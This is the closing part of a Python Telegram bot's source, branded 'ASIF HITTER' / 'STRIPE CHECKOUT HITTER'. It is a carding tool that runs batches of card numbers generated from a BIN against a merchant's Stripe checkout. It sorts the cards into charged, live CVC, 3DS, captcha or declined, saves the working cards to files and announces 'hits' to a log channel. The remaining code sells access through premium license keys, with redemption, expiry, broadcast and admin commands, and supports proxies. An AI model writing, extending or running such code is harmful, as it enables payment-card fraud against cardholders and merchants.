            result_lines.append(f"<b>CC:</b> <code>{r['card']}</code>\n<b>Status:</b> {e('🟢')} Charged ✅\n<b>Response:</b> {h(r['msg'])}")
        elif sts == "LIVE":
            live_cards.append(r["card"])
            result_lines.append(f"<b>CC:</b> <code>{r['card']}</code>\n<b>Status:</b> {e('🔵')} Live CVC Match\n<b>Response:</b> {h(r['msg'])}")
            dc += 1
        elif sts == "3DS":
            td += 1
            result_lines.append(f"<b>CC:</b> <code>{r['card']}</code>\n<b>Status:</b> 🟡 3DS Required\n<b>Response:</b> {h(r['msg'])}")
        elif sts == "HCAPTCHA":
            hc += 1
            result_lines.append(f"<b>CC:</b> <code>{r['card']}</code>\n<b>Status:</b> {e('⛔')} Captcha\n<b>Response:</b> {h(r['msg'])}")
        elif sts == "DECLINED":
            dc += 1
            result_lines.append(f"<b>CC:</b> <code>{r['card']}</code>\n<b>Status:</b> 🔴 Failed ❌\n<b>Response:</b> {h(r['msg'])}")
        else:
            er += 1
            result_lines.append(f"<b>CC:</b> <code>{r['card']}</code>\n<b>Status:</b> ⚪ Error\n<b>Response:</b> {h(r['msg'])}")
        
        await asyncio.sleep(4.0)
    
    # Build final output
    final = f"""{e('👑')} <b>STRIPE CHECKOUT HITTER</b> {e('👑')}

{e('📦')} <b>Merchant:</b> {h(ck.mer)}
{e('💰')} <b>Amount:</b> {h(ck.amt)}
{e('💳')} <b>BIN:</b> {bin_in[:8]}xxxx

"""
    for line in result_lines:
        final += f"\n{line}\n{e('─'*20)}\n"
    
    final += f"""
{e('🏦')} <b>Site:</b> {h(ck.mer)} ({h(ck.site_url or 'N/A')})
{e('💰')} <b>Amount:</b> {h(ck.amt)}

{e('📊')} <b>SUMMARY:</b>
{e('🟢')} Charged: <b>{len(charged_cards)}</b>
{e('🔵')} Live: <b>{len(live_cards)}</b>
🟡 3DS: <b>{td}</b>
🔴 Failed: <b>{dc}</b>
{e('⛔')} Captcha: <b>{hc}</b>
⚪ Error: <b>{er}</b>

{e('❤️')} <b>Dev:</b> <a href="https://t.me/{DEV_USERNAME}">{DEV_NAME}</a>
"""
    
    # Save
    os.makedirs(DATA_DIR, exist_ok=True)
    if charged_cards:
        async with aiofiles.open(f"{DATA_DIR}/charged.txt", "a") as f:
            await f.write("\n".join(charged_cards) + "\n")
    if live_cards:
        async with aiofiles.open(f"{DATA_DIR}/live.txt", "a") as f:
            await f.write("\n".join(live_cards) + "\n")
    
    # Send (chunk if needed)
    if len(final) > 3900:
        parts = [final[i:i+3800] for i in range(0, len(final), 3800)]
        for i, part in enumerate(parts):
            if i == 0:
                await st.edit_text(part, parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text(part, parse_mode=ParseMode.HTML)
                await asyncio.sleep(0.3)
    else:
        await st.edit_text(final, parse_mode=ParseMode.HTML)
    
    # Log
    log_ch = await get_setting("log_channel", "")
    if log_ch and (charged_cards or live_cards):
        try:
            await ctx.bot.send_message(
                log_ch,
                f"{e('🔥')} <b>HIT</b>\n{e('👤')} <a href=\"tg://user?id={uid}\">{h(update.effective_user.full_name)}</a>\n"
                f"{e('📦')} {h(ck.mer)} | {e('💰')} {h(ck.amt)}\n"
                f"{e('🟢')} {len(charged_cards)} | {e('🔵')} {len(live_cards)}",
                parse_mode=ParseMode.HTML
            )
        except: pass

# ═══════════════ REDEEM ═══════════════

async def cmd_redeem(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    
    if await is_premium(uid):
        pd = await jload(PREMIUM_FILE)
        u = pd["users"].get(str(uid), {})
        await update.message.reply_text(
            f"{e('⛔')} <b>ALREADY PREMIUM</b>\n\n"
            f"{e('⏱️')} Expires: <code>{u.get('expiry','?')[:10]}</code>\n"
            f"{e('💎')} Plan: <code>{u.get('plan','?')}</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not ctx.args:
        await update.message.reply_text(f"{e('⚠️')} <code>/redeem &lt;key&gt;</code>", parse_mode=ParseMode.HTML)
        return
    
    key = ctx.args[0]
    
    kd = await jload(KEYS_FILE, {"keys": {}})
    
    if key not in kd["keys"]:
        await update.message.reply_text(f"{e('❌')} Invalid key!", parse_mode=ParseMode.HTML)
        return
    
    kdata = kd["keys"][key]
    if kdata.get("used"):
        await update.message.reply_text(
            f"{e('❌')} <b>KEY ALREADY USED</b>\n\n"
            f"{e('🔑')} This key was already redeemed.\n"
            f"{e('ℹ️')} Get a new key from admin.",
            parse_mode=ParseMode.HTML
        )
        return
    
    hours = kdata.get("hours", kdata.get("days", 1) * 24)
    expiry = (datetime.now() + timedelta(hours=hours)).isoformat()
    
    kdata["used"] = True
    kdata["used_by"] = uid
    kdata["expiry"] = expiry
    kdata["redeemed_at"] = datetime.now().isoformat()
    await jsave(KEYS_FILE, kd)
    
    dur = f"{hours//24} day(s)" if hours >= 24 else f"{hours} hour(s)"
    
    pd = await jload(PREMIUM_FILE, {"users": {}})
    pd["users"][str(uid)] = {
        "name": update.effective_user.full_name,
        "username": update.effective_user.username or "",
        "activated": datetime.now().isoformat(),
        "expiry": expiry,
        "key": key,
        "plan": dur,
    }
    await jsave(PREMIUM_FILE, pd)
    
    await update.message.reply_text(
        f"{ec('🎉',3)} <b>PREMIUM ACTIVATED!</b> {ec('🎉',3)}\n\n"
        f"{e('👑')} Welcome to ASIF HITTER Premium!\n\n"
        f"{e('🔑')} <b>Key:</b> <code>{key}</code>\n"
        f"{e('⏱️')} <b>Expires:</b> <code>{expiry[:10]}</code>\n"
        f"{e('💎')} <b>Plan:</b> <code>{dur}</code>\n\n"
        f"{e('🚀')} Use <code>/hit</code> to start!\n"
        f"{e('❤️')} Enjoy!",
        parse_mode=ParseMode.HTML
    )
    
    log_ch = await get_setting("log_channel", "")
    if log_ch:
        try:
            await ctx.bot.send_message(log_ch,
                f"{e('🎉')} <b>REDEEMED</b>\n{e('👤')} <a href=\"tg://user?id={uid}\">{h(update.effective_user.full_name)}</a>\n"
                f"{e('🔑')} <code>{key}</code>\n{e('💎')} {dur}",
                parse_mode=ParseMode.HTML)
        except: pass

async def cmd_auth(update, ctx):
    await cmd_redeem(update, ctx)

async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    adm = is_admin(uid)
    
    if adm:
        await update.message.reply_text(f"{e('⚡')} {e('👑')} <b>ADMIN</b>\n\n{e('✅')} Full access — permanent", parse_mode=ParseMode.HTML)
    elif await is_premium(uid):
        pd = await jload(PREMIUM_FILE)
        u = pd["users"].get(str(uid), {})
        await update.message.reply_text(
            f"{e('👑')} <b>PREMIUM ACTIVE</b>\n\n"
            f"{e('⏱️')} Expires: <code>{u.get('expiry','?')[:10]}</code>\n"
            f"{e('💎')} Plan: <code>{u.get('plan','?')}</code>",
            parse_mode=ParseMode.HTML
        )
    else:
        await update.message.reply_text(f"{e('⛔')} <b>FREE</b>\n\n{e('🔑')} /redeem &lt;key&gt;", parse_mode=ParseMode.HTML)

# ═══════════════ ADMIN ═══════════════

async def cmd_genkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
    if len(ctx.args) < 2:
        await update.message.reply_text(
            f"{e('⚠️')} <code>/genkey 10 24 1</code> — 10 keys, 24h\n<code>/genkey 5 7 0</code> — 5 keys, 7d",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        count, dur = int(ctx.args[0]), int(ctx.args[1])
        mode = int(ctx.args[2]) if len(ctx.args) > 2 else 1
    except:
        await update.message.reply_text(f"{e('❌')} Invalid numbers", parse_mode=ParseMode.HTML)
        return
    
    hours = dur if mode == 1 else dur * 24
    dur_str = f"{dur}h" if mode == 1 else f"{dur}d"
    
    kd = await jload(KEYS_FILE, {"keys": {}})
    new_keys = []
    
    for _ in range(count):
        k = f"ASIF-{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=20))}"
        while k in kd["keys"]:
            k = f"ASIF-{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=20))}"
        
        kd["keys"][k] = {"hours": hours, "used": False, "used_by": None, "created": datetime.now().isoformat()}
        new_keys.append(k)
    
    await jsave(KEYS_FILE, kd)
    
    txt = f"{e('🎁')} <b>KEYS GENERATED</b>\n\n{e('📦')} <b>{count}</b> keys | {e('⏱️')} <b>{dur_str}</b>\n\n" + "\n".join([f"<code>{k}</code>" for k in new_keys])
    
    if len(new_keys) > 15:
        buf = StringIO("\n".join(new_keys))
        buf.name = "keys.txt"
        await update.message.reply_document(InputFile(buf, filename="ASIF_keys.txt"), caption=f"{count} keys ({dur_str})")
    else:
        await update.message.reply_text(txt, parse_mode=ParseMode.HTML)

async def cmd_premium(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
    pd = await jload(PREMIUM_FILE, {"users": {}})
    users = pd.get("users", {})
    
    if not users:
        await update.message.reply_text(f"{e('❌')} No users", parse_mode=ParseMode.HTML)
        return
    
    txt = f"{e('👑')} <b>PREMIUM USERS ({len(users)})</b>\n\n"
    for uid, u in users.items():
        try:
            exp = datetime.fromisoformat(u.get("expiry","2000-01-01"))
            txt += f"{e('🟢') if datetime.now() < exp else e('🔴')} <a href=\"tg://user?id={uid}\">{h(u.get('name','?'))}</a>\n"
            txt += f"   {e('⏱️')} {u.get('expiry','?')[:10]} | {e('💎')} {u.get('plan','?')}\n\n"
        except: pass
    
    if len(txt) > 3900:
        await update.message.reply_text(txt[:3900], parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(txt, parse_mode=ParseMode.HTML)

async def cmd_rmsub(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if not ctx.args:
        await update.message.reply_text(f"{e('⚠️')} /rmsub &lt;user_id&gt;", parse_mode=ParseMode.HTML)
        return
    
    uid = ctx.args[0]
    pd = await jload(PREMIUM_FILE, {"users": {}})
    if uid not in pd.get("users", {}):
        await update.message.reply_text(f"{e('❌')} Not found", parse_mode=ParseMode.HTML)
        return
    
    del pd["users"][uid]
    await jsave(PREMIUM_FILE, pd)
    await update.message.reply_text(f"{e('✅')} Removed", parse_mode=ParseMode.HTML)

async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    msg = update.message.text.replace("/broadcast", "").strip()
    if not msg:
        await update.message.reply_text(f"{e('⚠️')} /broadcast &lt;msg&gt;", parse_mode=ParseMode.HTML)
        return
    
    pd = await jload(PREMIUM_FILE, {"users": {}})
    sent = 0
    for uid in pd.get("users", {}):
        try:
            await ctx.bot.send_message(int(uid), f"{e('📢')} <b>BROADCAST</b>\n\n{msg}", parse_mode=ParseMode.HTML)
            sent += 1
            await asyncio.sleep(0.2)
        except: pass
    await update.message.reply_text(f"{e('✅')} Sent: <b>{sent}</b>", parse_mode=ParseMode.HTML)

async def cmd_sethits(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if ctx.args:
        await update_setting("log_channel", ctx.args[0])
        await update.message.reply_text(f"{e('✅')} Set: {h(ctx.args[0])}", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(f"{e('ℹ️')} /sethits @channel", parse_mode=ParseMode.HTML)

# ═══════════════ CALLBACKS ═══════════════

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    d = q.data
    uid = q.from_user.id
    
    if d == "gate_help":
        await q.message.reply_text(f"{e('🌐')} <b>Gateway</b>\n<code>/gate &lt;url&gt;</code>", parse_mode=ParseMode.HTML)
    elif d == "hit_help":
        await q.message.reply_text(f"{e('💳')} <b>Hit</b>\n<code>/hit &lt;url&gt; &lt;bin&gt;</code>", parse_mode=ParseMode.HTML)
    elif d == "redeem_help":
        await q.message.reply_text(f"{e('🔑')} <b>Redeem</b>\n<code>/redeem &lt;key&gt;</code>", parse_mode=ParseMode.HTML)
    elif d == "status":
        await cmd_status(update, ctx)
    elif d == "proxy_menu":
        await q.message.reply_text(f"{e('🔐')} <b>Proxy</b>\n/addproxy | /proxy | /rmproxy", parse_mode=ParseMode.HTML)
    elif d == "admin" and is_admin(uid):
        await q.message.reply_text(
            f"{e('⚡')} <b>ADMIN</b>\n/genkey | /premium | /rmsub | /broadcast | /sethits",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔑 Gen Keys", callback_data="genkey_menu")],
                [InlineKeyboardButton("👥 Users", callback_data="prem_list")],
            ])
        )

# ═══════════════ EXPIRE CHECKER ═══════════════

async def expire_checker(ctx: ContextTypes.DEFAULT_TYPE):
    pd = await jload(PREMIUM_FILE, {"users": {}})
    expired = []
    for uid, u in pd.get("users", {}).items():
        try:
            if datetime.now() > datetime.fromisoformat(u.get("expiry","2000-01-01")):
                expired.append(uid)
        except: pass
    
    for uid in expired:
        del pd["users"][uid]
        try:
            await ctx.bot.send_message(int(uid),
                f"{ec('⛔',3)} <b>PREMIUM EXPIRED</b> {ec('⛔',3)}\n\n"
                f"{e('🔑')} /redeem with new key\n{e('❤️')} <a href=\"https://t.me/{DEV_USERNAME}\">{DEV_NAME}</a>",
                parse_mode=ParseMode.HTML)
        except: pass
    
    if expired:
        await jsave(PREMIUM_FILE, pd)

# ═══════════════ MAIN ═══════════════

async def post_init(app: Application):
    await load_settings()
    print(f"✅ Bot v3.3 started | Log: {await get_setting('log_channel','N/A')}")

def main():
    os.makedirs(DATA_DIR, exist_ok=True)
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("addproxy", cmd_addproxy))
    app.add_handler(CommandHandler("proxy", cmd_proxy))
    app.add_handler(CommandHandler("rmproxy", cmd_rmproxy))
    app.add_handler(CommandHandler("gate", cmd_gate))
    app.add_handler(CommandHandler("hit", cmd_hit))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("auth", cmd_auth))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("genkey", cmd_genkey))
    app.add_handler(CommandHandler("premium", cmd_premium))
    app.add_handler(CommandHandler("rmsub", cmd_rmsub))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("sethits", cmd_sethits))
    app.add_handler(CallbackQueryHandler(on_callback))
    
    if app.job_queue:
        app.job_queue.run_repeating(expire_checker, interval=1800, first=30)
    
    print("✅ Running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()